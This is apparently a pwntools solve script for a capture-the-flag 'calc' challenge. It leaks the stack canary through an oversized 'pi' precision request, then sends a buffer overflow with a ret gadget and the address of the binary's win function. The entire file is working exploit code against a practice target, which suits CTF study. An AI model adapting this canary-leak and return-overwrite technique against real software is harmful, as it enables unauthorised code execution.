#!/usr/bin/env python3

from pwn import *

exe = ELF("./calc")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13377)

    return r


def main():
    r = conn()

    # Leak the canary
    r.sendlineafter(b'operand: ', b'pi')
    r.sendlineafter(b'to use: ', str(0x2720-2).encode())
    canary = r.recvline().strip()[-8:]
    log.info(f"{canary=}")

    # Fill in the rest of the inputs
    r.sendlineafter(b'operator: ', b'+')
    r.sendlineafter(b'operand: ', b'1')

    # buf overflow
    r.sendlineafter(b'here: ', 
        b'A'*0x28 +
        canary +
        b'A'*8 + # Arbitrary stored rbp
        p64(0x401512) + # [ret] gadget for stack alignment
        p64(exe.symbols.win)
    )

    r.interactive()


if __name__ == "__main__":
    main()
